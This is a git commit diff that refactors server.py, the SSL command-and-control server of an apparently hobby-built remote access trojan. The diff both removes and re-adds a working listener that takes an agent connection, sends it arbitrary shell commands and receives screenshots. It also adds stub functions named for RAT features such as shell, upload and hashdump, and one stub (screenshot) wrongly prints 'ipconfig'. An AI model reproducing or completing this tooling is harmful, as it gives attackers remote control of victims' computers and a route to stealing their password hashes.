2cdbcedd854a6eff68c51a455c0f47272a7f8bd0
PerThoGon <enzo.marini888@gmail.com>
2024-06-11 22:09:16 +0200

    refonte et épuration du code

--- server.py
+++ server.py
@@ -5,45 +5,82 @@ from dotenv import load_dotenv
 
 SERVER_PORT = 8888
 
-load_dotenv()
-ip_server = os.getenv('IP_SERVER')
+def menu_help() :
+    print('help')
 
-cert = './cert.pem'
-key = './key.pem'
+def download() :
+    print('download')
 
-# Créer un contexte SSL
-context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-context.load_cert_chain(certfile=cert, keyfile=key)
+def upload() :
+    print('upload')
 
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_socket.bind((ip_server, SERVER_PORT))
-server_socket.listen(1)
-print(f"[*] Listening on {SERVER_PORT}...")
+def shell() :
+    print('shell')
 
-# Envelopper le socket avec SSL
-with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
-    client_socket, client_address = ssl_socket.accept()
-    print("[+] Agent received !")
+def ipconfig() :
+    print('ipconfig')
 
-    while True:
-        command = input("rat > Taper votre commande ici : ")
-        if command.lower() == 'exit':
-            client_socket.send(b'exit')
-            break
-        elif command.lower() == 'screenshot':
-            client_socket.send(b'screenshot')
-            with open('screenshot.png', 'wb') as f:
-                while True:
-                    data = client_socket.recv(1024)
-                    if data.endswith(b'DONE'):
-                        f.write(data[:-4])
-                        break
-                    f.write(data)
-            print("[+] Screenshot received and saved as 'screenshot.png'")
-        else:
-            client_socket.send(command.encode())
-            result = client_socket.recv(1024).decode()
-            print(result)
+def screenshot() :
+    print('ipconfig')
 
-    client_socket.close()
-server_socket.close()
+def search() :
+    print('search')
+
+def hashdump() :
+    print('hashdump')
+
+
+
+def main() :
+
+    load_dotenv()
+    ip_server = os.getenv('IP_SERVER')
+
+    cert = './cert.pem'
+    key = './key.pem'
+
+    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    context.load_cert_chain(certfile=cert, keyfile=key)
+
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((ip_server, SERVER_PORT))
+    server_socket.listen(1)
+
+    print(f"[*] Listening on {SERVER_PORT}...")
+
+    # Envelopper le socket avec SSL
+    with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
+        client_socket, client_address = ssl_socket.accept()
+        print("[+] Agent received !")
+
+        while True:
+            command = input("rat > Taper votre commande ici : ")
+            if command.lower() == 'help':
+                menu_help()
+            elif command.lower() == 'download':
+                download()
+            elif command.lower() == 'upload':
+                upload()
+            elif command.lower() == 'shell':
+                shell()
+            elif command.lower() == 'ipconfig':
+                ipconfig()
+            elif command.lower() == 'screenshot':
+                screenshot()
+            elif command.lower() == 'search':
+                search()
+            elif command.lower() == 'hashdump':
+                hashdump()
+            elif command.lower() == 'exit':
+                client_socket.send(b'exit')
+                break
+            else:
+                client_socket.send(command.encode())
+                result = client_socket.recv(1024).decode()
+                print(result)
+        client_socket.close()
+    server_socket.close()
+
+
+if __name__ == "__main__":
+    main()
